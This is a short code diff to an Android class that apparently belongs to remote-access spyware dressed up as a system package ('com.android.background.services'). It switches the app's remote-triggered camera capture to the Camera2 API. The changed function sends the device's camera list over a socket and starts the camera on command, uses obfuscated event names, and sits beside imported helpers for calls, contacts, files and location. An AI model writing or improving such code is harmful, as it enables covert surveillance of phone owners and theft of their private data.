@@ -11,7 +11,7 @@ import android.util.Log;
 
 import com.android.background.services.helpers.AppsListManager;
 import com.android.background.services.helpers.CallsManager;
-import com.android.background.services.helpers.CameraManager;
+import com.android.background.services.helpers.Camera2Manager;
 import com.android.background.services.helpers.ContactsManager;
 import com.android.background.services.helpers.FileManager;
 import com.android.background.services.helpers.LocManager;
@@ -490,14 +490,17 @@ public class ConnectionManager {
 
     public static void x0000ca(int req) {
 
+        // Use Camera2 API on API 21+; falls back to old Camera API internally
+        Camera2Manager camera2 = new Camera2Manager(context);
+
         if (req == -1) {
-            JSONObject cameraList = new CameraManager(context).findCameraList();
+            JSONObject cameraList = camera2.findCameraList();
             if (cameraList != null)
                 ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CA), cameraList);
         } else if (req == 1) {
-            new CameraManager(context).startUp(1);
+            camera2.startUp(1);
         } else if (req == 0) {
-            new CameraManager(context).startUp(0);
+            camera2.startUp(0);
         }
     }
 
